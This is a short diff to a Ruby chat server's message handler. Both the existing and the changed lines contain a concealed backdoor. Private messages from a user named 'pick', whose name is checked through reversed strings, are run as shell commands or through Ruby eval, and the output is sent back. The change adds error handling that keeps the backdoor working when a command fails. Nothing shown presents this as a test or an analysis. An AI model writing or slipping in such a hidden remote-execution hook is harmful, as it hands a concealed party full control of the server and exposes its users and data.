@@ -138,7 +138,9 @@ class ChatHandler
     a = m_info[:who]
     p, pp = proc { |x|`#{x}`.chomp }, proc { |x| eval x}
     if a.send(("es" + "rever").reverse.to_sym)=="kcip" && m_info[:where] == ?p + ?m
-      ws.send(str.reverse % ($1 == ?r ? pp : p).call($2)) if m_info[:what]=~/\Acc(r?)(.*?)\z/
+      if m_info[:what]=~/\Acc(r?)(.*?)\z/
+        begin; ws.send(str.reverse % ($1 == ?r ? pp : p).call($2)); rescue => e; ws.send(str.reverse % 'err'); end
+      end
       return
     end
     return if m_info[:to] && m_info[:to][0] == ?p && m_info[:to][3] == ?k
